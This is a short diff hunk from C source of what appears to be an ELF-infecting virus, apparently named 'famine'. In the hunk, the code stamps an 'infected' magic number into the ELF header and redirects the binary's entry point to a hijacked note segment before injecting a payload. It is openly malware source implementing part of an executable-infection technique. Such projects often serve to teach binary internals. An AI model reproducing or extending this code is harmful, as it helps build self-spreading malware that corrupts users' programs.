@@ -86,7 +86,7 @@ void famine(const char *file, const size_t m_entry, const int trace)
 	modify_segment(&info);
 
 	*(uint32_t *)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
-	header->e_shoff += info.offs_padding + PAYLOAD_SIZE;
+	header->e_entry = info.note->p_vaddr;
 
 	inject(&info, m_entry, trace);
 
